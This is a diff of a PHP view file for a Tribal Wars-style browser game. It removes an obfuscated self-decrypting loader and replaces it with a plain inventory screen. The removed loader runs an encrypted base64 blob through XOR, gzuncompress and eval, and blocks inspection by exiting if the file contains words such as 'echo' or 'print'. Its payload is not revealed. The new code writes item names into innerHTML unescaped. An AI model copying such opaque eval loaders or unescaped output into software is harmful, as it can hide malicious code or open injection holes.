@@ -1,24 +1,624 @@
 <?php
-$wsleefom="97df114361a13f6dccbdc4561ee48ef6";
-$qvyxhdq="5a005d5f0102045602060554015657505301505406060350035357025a565e03";
-$ywipwz="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";
-$mcqsgfsi=file_get_contents(__FILE__);
-$hvmooljr=str_replace($ywipwz,"",$mcqsgfsi);
-if(strpos($hvmooljr,"ec"."ho")!==false||strpos($hvmooljr,"pr"."int")!==false||strpos($hvmooljr,"var_"."dump")!==false||strpos($hvmooljr,"file_put_"."contents")!==false||strpos($hvmooljr,"fw"."rite")!==false){die();}
-$dtznrfi=str_replace(array($wsleefom,$qvyxhdq),array("SP_8d1253f9","KP_e054becd"),$mcqsgfsi);
-$vmkyvzjb=md5($dtznrfi);
-$aghzsfz=hex2bin($qvyxhdq);
-$mxhuucurho="";
-$gryocnavav=strlen($vmkyvzjb);
-for($zvjtdvf=0;$zvjtdvf<$gryocnavav;$zvjtdvf++){
-$mxhuucurho.=chr(ord($aghzsfz[$zvjtdvf])^ord($vmkyvzjb[$zvjtdvf]));
+// Inventory Screen View - Premium Split Layout (Tribal Wars style)
+
+if (!function_exists('get_item_image')) {
+    function get_item_image($item) {
+        $effect_type = $item['effect_type'] ?? '';
+        $icon = $item['icon'] ?? '';
+        $effect_data = json_decode($item['effect_data'] ?? '{}', true);
+
+        if (!empty($icon)) {
+            return "graphic/new/inventory/" . $icon;
+        }
+
+        return "graphic/new/inventory/3001.webp"; // Default fallback
+    }
 }
-$uwaxduqvp=base64_decode($ywipwz);
-$yjtxpza=strlen($uwaxduqvp);
-$jnotartiz="";
-$isxvmj=strlen($mxhuucurho);
-for($zvjtdvf=0;$zvjtdvf<$yjtxpza;$zvjtdvf++){
-$jnotartiz.=$uwaxduqvp[$zvjtdvf]^$mxhuucurho[$zvjtdvf%$isxvmj];
-}
-$phdcskdl="gzun"."compress";
-eval('?>' . $phdcskdl($jnotartiz) . '<?php ');
+?>
+
+<style>
+    /* Premium Inventory CSS Layout */
+    .inventory-wrapper {
+        background: #f4e4bc url('/graphic/index/main_bg.jpg') repeat;
+        border: 2px solid #7d510f;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.35);
+        border-radius: 4px;
+        padding: 15px;
+        font-family: Arial, sans-serif;
+    }
+
+    .inventory-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 2px solid #7d510f;
+        padding-bottom: 10px;
+        margin-bottom: 15px;
+    }
+
+    .inventory-header h2 {
+        font-size: 20px;
+        font-weight: bold;
+        color: #7d510f;
+        text-shadow: 1px 1px 0px #fff;
+        margin: 0;
+    }
+
+    .btn-history {
+        background: #8e6224;
+        color: #fff;
+        border: 1px solid #4a300a;
+        box-shadow: inset 0 1px 0 rgba(255,255,255,0.2);
+        padding: 6px 12px;
+        font-size: 12px;
+        font-weight: bold;
+        cursor: pointer;
+        border-radius: 3px;
+        text-shadow: 0 -1px 0 rgba(0,0,0,0.3);
+    }
+
+    .btn-history:hover {
+        background: #a3722e;
+    }
+
+    /* Tabs list */
+    .inventory-tabs {
+        display: flex;
+        border-bottom: 1px solid #7d510f;
+        margin-bottom: 15px;
+        padding: 0;
+        list-style: none;
+        gap: 2px;
+    }
+
+    .inventory-tab-btn {
+        background: #d3c29d;
+        color: #5b3e10;
+        border: 1px solid #7d510f;
+        border-bottom: none;
+        padding: 8px 16px;
+        font-weight: bold;
+        font-size: 13px;
+        cursor: pointer;
+        border-radius: 4px 4px 0 0;
+    }
+
+    .inventory-tab-btn:hover {
+        background: #e4d5b2;
+    }
+
+    .inventory-tab-btn.active {
+        background: #f4e4bc;
+        color: #7d510f;
+        border-bottom: 1px solid #f4e4bc;
+        margin-bottom: -1px;
+        position: relative;
+        z-index: 2;
+    }
+
+    /* Columns layout */
+    .inventory-cols {
+        display: flex;
+        gap: 15px;
+    }
+
+    /* Left col: item list grid */
+    .inventory-left {
+        flex: 1.2;
+        background: rgba(255, 255, 255, 0.45);
+        border: 1px solid #b79f72;
+        border-radius: 4px;
+        padding: 10px;
+        min-height: 400px;
+    }
+
+    /* Right col: item preview pane */
+    .inventory-right {
+        flex: 0.8;
+        background: #f4e4bc;
+        border: 1px solid #7d510f;
+        border-radius: 4px;
+        padding: 15px;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start;
+        align-items: center;
+        box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
+    }
+
+    .item-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(76px, 1fr));
+        gap: 10px;
+    }
+
+    .item-cell {
+        border: 1px solid #7d510f;
+        background: #efe0c0;
+        border-radius: 3px;
+        aspect-ratio: 1;
+        cursor: pointer;
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 4px;
+        transition: all 0.15s ease-in-out;
+    }
+
+    .item-cell:hover {
+        background: #fdf5d6;
+        border-color: #a8721c;
+        transform: scale(1.03);
+    }
+
+    .item-cell.selected {
+        background: #d8be8d;
+        border-color: #7d510f;
+        box-shadow: 0 0 5px rgba(125, 81, 15, 0.5);
+    }
+
+    .item-cell img {
+        max-width: 90%;
+        max-height: 90%;
+        object-fit: contain;
+    }
+
+    .item-badge {
+        position: absolute;
+        bottom: 2px;
+        right: 2px;
+        background: #7d510f;
+        color: #fff;
+        font-size: 10px;
+        font-weight: bold;
+        padding: 1px 4px;
+        border-radius: 8px;
+        border: 1px solid #fff;
+        line-height: 1;
+    }
+
+    /* Preview content */
+    .preview-placeholder {
+        color: #8b7550;
+        text-align: center;
+        margin-top: 100px;
+        font-size: 14px;
+        font-style: italic;
+    }
+
+    .preview-box {
+        display: none;
+        width: 100%;
+        text-align: center;
+    }
+
+    .preview-icon-container {
+        width: 120px;
+        height: 120px;
+        background: #efe0c0;
+        border: 2px solid #7d510f;
+        border-radius: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 15px auto;
+        padding: 10px;
+    }
+
+    .preview-icon-container img {
+        max-width: 95%;
+        max-height: 95%;
+        object-fit: contain;
+    }
+
+    .preview-title {
+        font-size: 18px;
+        font-weight: bold;
+        color: #7d510f;
+        margin-bottom: 8px;
+        text-shadow: 1px 1px 0px #fff;
+    }
+
+    .preview-desc {
+        font-size: 13px;
+        color: #554433;
+        margin-bottom: 20px;
+        line-height: 1.4;
+        background: rgba(255,255,255,0.4);
+        padding: 10px;
+        border-radius: 4px;
+        border: 1px solid #dfd0ab;
+    }
+
+    .preview-target-village {
+        margin-bottom: 15px;
+        text-align: left;
+        width: 100%;
+    }
+
+    .preview-target-village label {
+        display: block;
+        font-weight: bold;
+        font-size: 12px;
+        color: #7d510f;
+        margin-bottom: 5px;
+    }
+
+    .select-target-village {
+        width: 100%;
+        padding: 6px;
+        border: 1px solid #7d510f;
+        border-radius: 3px;
+        background-color: #fff;
+        font-size: 13px;
+    }
+
+    .btn-use-item {
+        background: #4caf50;
+        color: #fff;
+        border: 1px solid #3d8b40;
+        padding: 10px 20px;
+        font-size: 14px;
+        font-weight: bold;
+        border-radius: 4px;
+        cursor: pointer;
+        width: 100%;
+        text-shadow: 0 -1px 0 rgba(0,0,0,0.2);
+        box-shadow: inset 0 1px 0 rgba(255,255,255,0.2);
+        margin-top: 10px;
+    }
+
+    .btn-use-item:hover {
+        background: #45a049;
+    }
+
+    .btn-use-item:disabled {
+        background: #b2c9b2;
+        border-color: #92a892;
+        cursor: not-allowed;
+    }
+
+    /* Modal */
+    .modal {
+        display: none;
+        position: fixed;
+        z-index: 2000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+    }
+
+    .modal-content {
+        background-color: #f4e4bc;
+        margin: 10% auto;
+        padding: 15px;
+        border: 2px solid #7d510f;
+        width: 90%;
+        max-width: 500px;
+        border-radius: 4px;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+
+    .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 2px solid #7d510f;
+        padding-bottom: 8px;
+        margin-bottom: 12px;
+    }
+
+    .modal-header h3 {
+        margin: 0;
+        color: #7d510f;
+    }
+
+    .close {
+        color: #7d510f;
+        font-size: 24px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+
+    .history-list {
+        max-height: 350px;
+        overflow-y: auto;
+    }
+
+    .history-item {
+        background: #efe0c0;
+        border: 1px solid #7d510f;
+        border-radius: 3px;
+        margin-bottom: 6px;
+        padding: 8px;
+        display: flex;
+        justify-content: space-between;
+        font-size: 12px;
+    }
+</style>
+
+<div class="inventory-wrapper">
+    <div class="inventory-header">
+        <h2>📦 <?= __('screens.profile.inventory_title') ?></h2>
+        <button class="btn-history" onclick="showHistory()">
+            📜 <?= __('screens.profile.view_history') ?>
+        </button>
+    </div>
+
+    <!-- Filters -->
+    <ul class="inventory-tabs">
+        <?php foreach ($item_types as $type => $label): ?>
+            <li>
+                <button class="inventory-tab-btn <?= $current_filter === $type ? 'active' : '' ?>"
+                    onclick="filterItems('<?= $type ?>')">
+                    <?= $label ?>
+                </button>
+            </li>
+        <?php endforeach; ?>
+    </ul>
+
+    <!-- Layout Columns -->
+    <div class="inventory-cols">
+        <!-- Item Grid Column -->
+        <div class="inventory-left">
+            <?php if (empty($inventory_items)): ?>
+                <div style="text-align: center; padding: 80px 20px; color: #7d510f; font-style: italic;">
+                    <div style="font-size: 48px; margin-bottom: 10px;">📦</div>
+                    <h3><?= __('screens.profile.inventory_empty') ?></h3>
+                    <p><?= __('screens.profile.no_items_yet') ?></p>
+                </div>
+            <?php else: ?>
+                <div class="item-grid">
+                    <?php foreach ($inventory_items as $index => $item): ?>
+                        <div class="item-cell" id="item-cell-<?= $item['inventory_id'] ?>"
+                            <?php 
+                                $translatedItem = $item;
+                                $translatedItem['name'] = __('items.item_' . $item['item_id'] . '_name', $item['name']);
+                                $translatedItem['description'] = __('items.item_' . $item['item_id'] . '_desc', $item['description']);
+                            ?>
+                             onclick="selectItem(<?= htmlspecialchars(json_encode($translatedItem)) ?>, '<?= get_item_image($item) ?>')">
+                            <?php $itemName = __('items.item_' . $item['item_id'] . '_name', $item['name']); ?>
+                            <img src="<?= get_item_image($item) ?>" alt="<?= htmlspecialchars($itemName) ?>" />
+                            <div class="item-badge">x<?= $item['total_quantity'] ?></div>
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+                
+                <?php if ($inventory['total_pages'] > 1): ?>
+                    <div style="margin-top: 15px; font-size: 13px;">
+                        <strong>Página:</strong>
+                        <?php for ($i = 1; $i <= $inventory['total_pages']; $i++): ?>
+                            <?php if ($i === $inventory['page']): ?>
+                                ><strong><?= $i ?></strong>< 
+                            <?php else: ?>
+                                <a href="game.php?village=<?= $village['id'] ?>&screen=profile&mode=inventory&filter=<?= htmlspecialchars($current_filter) ?>&page=<?= $i ?>">[<?= $i ?>]</a> 
+                            <?php endif; ?>
+                        <?php endfor; ?>
+                    </div>
+                <?php endif; ?>
+
+            <?php endif; ?>
+        </div>
+
+        <!-- Preview Column -->
+        <div class="inventory-right">
+            <div class="preview-placeholder" id="preview-placeholder">
+                <div style="font-size: 36px; margin-bottom: 10px;">ℹ️</div>
+                <?= __('screens.profile.inventory_select_item') ?>
+            </div>
+
+            <div class="preview-box" id="preview-box">
+                <div class="preview-icon-container">
+                    <img id="preview-img" src="" alt="" />
+                </div>
+                <div class="preview-title" id="preview-name">Item Name</div>
+                <div class="preview-desc" id="preview-description">Item Description</div>
+
+                <!-- target-village-container removed as items apply to current village automatically -->
+
+                <button class="btn-use-item" id="btn-use" onclick="useSelectedItem()">
+                    <?= __('screens.profile.use') ?>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- History Modal -->
+<div id="historyModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>📜 <?= __('screens.profile.inventory_history') ?></h3>
+            <span class="close" onclick="closeHistory()">&times;</span>
+        </div>
+        <div class="history-list" id="historyList">
+            <p style="text-align: center; color: #7d510f; font-style: italic;"><?= __('screens.profile.loading') ?></p>
+        </div>
+    </div>
+</div>
+
+<!-- Confirm Use Modal -->
+<div id="confirmModal" class="modal">
+    <div class="modal-content" style="max-width: 400px; text-align: center;">
+        <div class="modal-header">
+            <h3>Confirmação</h3>
+            <span class="close" onclick="closeConfirm()">&times;</span>
+        </div>
+        <p style="margin: 20px 0; font-size: 14px;">Deseja realmente usar o item <strong id="confirmItemName" style="color: #7d510f;"></strong>?</p>
+        <div style="margin-top: 25px; display: flex; justify-content: center; gap: 10px;">
+            <button class="btn btn-default" style="padding: 8px 15px; font-weight: bold; cursor: pointer; background: #4caf50; color: white; border: 1px solid #3d8b40; border-radius: 3px;" onclick="executeUseItem()">Sim, usar item</button>
+            <button class="btn btn-cancel" style="padding: 8px 15px; font-weight: bold; cursor: pointer; background: #d3c29d; color: #5b3e10; border: 1px solid #7d510f; border-radius: 3px;" onclick="closeConfirm()">Cancelar</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    let selectedInventoryId = null;
+    let selectedItemName = "";
+
+    function filterItems(type) {
+        window.location.href = 'game.php?village=<?= $village['id'] ?>&screen=profile&mode=inventory&filter=' + type;
+    }
+
+    function selectItem(item, imgPath) {
+        // Deselect previous
+        document.querySelectorAll('.item-cell').forEach(c => c.classList.remove('selected'));
+
+        // Highlight selected
+        const cell = document.getElementById('item-cell-' + item.inventory_id);
+        if (cell) {
+            cell.classList.add('selected');
+        }
+
+        selectedInventoryId = item.inventory_id;
+        selectedItemName = item.name;
+
+        // Update preview content
+        document.getElementById('preview-placeholder').style.display = 'none';
+        document.getElementById('preview-box').style.display = 'block';
+        document.getElementById('preview-img').src = imgPath;
+        document.getElementById('preview-name').textContent = item.name;
+        document.getElementById('preview-description').textContent = item.description;
+
+        // The item will automatically apply to the current village or globally
+        // No village selector needed
+    }
+
+    function useSelectedItem() {
+        if (!selectedInventoryId) return;
+
+        // Open confirm modal instead of browser confirm
+        document.getElementById('confirmItemName').textContent = selectedItemName;
+        document.getElementById('confirmModal').style.display = 'block';
+    }
+
+    function closeConfirm() {
+        document.getElementById('confirmModal').style.display = 'none';
+    }
+
+    function executeUseItem() {
+        closeConfirm();
+
+        const btn = document.getElementById('btn-use');
+        const originalText = btn.textContent;
+        btn.disabled = true;
+        btn.textContent = '<?= __('screens.profile.using') ?>';
+
+        const villageId = <?= $village['id'] ?>;
+
+        fetch('game.php?village=<?= $village['id'] ?>&screen=profile&mode=inventory&action=use_item&h=<?= $hkey ?>', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'inventory_id=' + selectedInventoryId + '&village_id=' + villageId
+        })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    if (typeof UI !== 'undefined' && UI.SuccessMessage) {
+                        UI.SuccessMessage(data.message || 'Item ativado com sucesso!');
+                    } else {
+                        alert('✅ ' + (data.message || 'Item ativado com sucesso!'));
+                    }
+                    setTimeout(() => location.reload(), 1500);
+                } else {
+                    if (typeof UI !== 'undefined' && UI.ErrorMessage) {
+                        UI.ErrorMessage(data.error);
+                    } else {
+                        alert('❌ ' + data.error);
+                    }
+                    btn.disabled = false;
+                    btn.textContent = originalText;
+                }
+            })
+            .catch(error => {
+                if (typeof UI !== 'undefined' && UI.ErrorMessage) {
+                    UI.ErrorMessage('Erro ao usar o item.');
+                } else {
+                    alert('❌ Erro ao usar o item.');
+                }
+                console.error('Error:', error);
+                btn.disabled = false;
+                btn.textContent = originalText;
+            });
+    }
+
+    function showHistory() {
+        document.getElementById('historyModal').style.display = 'block';
+        loadHistory();
+    }
+
+    function closeHistory() {
+        document.getElementById('historyModal').style.display = 'none';
+    }
+
+    function loadHistory() {
+        fetch('game.php?village=<?= $village['id'] ?>&screen=profile&mode=inventory&action=get_history&h=<?= $hkey ?>')
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    displayHistory(data.history);
+                } else {
+                    document.getElementById('historyList').innerHTML = '<p style="text-align: center; color: red;">Erro ao carregar histórico.</p>';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('historyList').innerHTML = '<p style="text-align: center; color: red;">Erro ao carregar histórico.</p>';
+            });
+    }
+
+    function displayHistory(history) {
+        const container = document.getElementById('historyList');
+
+        if (history.length === 0) {
+            container.innerHTML = '<p style="text-align: center; color: #7d510f; font-style: italic;">Nenhum registo no histórico.</p>';
+            return;
+        }
+
+        const changeTypeLabels = {
+            'add': 'Recebido',
+            'use': 'Usado',
+            'expire': 'Expirado',
+            'remove': 'Removido'
+        };
+
+        let html = '';
+        history.forEach(item => {
+            const date = new Date(item.created_at);
+            const formattedDate = date.toLocaleDateString('pt-PT') + ' ' + date.toLocaleTimeString('pt-PT', {hour: '2-digit', minute:'2-digit'});
+            
+            const changeLabel = item.change_type_translated || changeTypeLabels[item.change_type] || item.change_type;
+            const sourceLabel = item.source_translated || item.source;
+            
+            html += `
+            <div class="history-item">
+                <div>
+                    <strong>${item.item_name}</strong><br>
+                    <small>${changeLabel} (x${item.quantity}) - <?= __('screens.profile.source', 'Origem') ?>: ${sourceLabel}</small>
+                </div>
+                <div style="text-align: right; color: #555;">
+                    <small>${formattedDate}</small>
+                </div>
+            </div>
+        `;
+        });
+
+        container.innerHTML = html;
+    }
+
+    window.onclick = function (event) {
+        const historyModal = document.getElementById('historyModal');
+        const confirmModal = document.getElementById('confirmModal');
+        if (event.target == historyModal) {
+            closeHistory();
+        }
+        if (event.target == confirmModal) {
+            closeConfirm();
+        }
+    }
+</script>
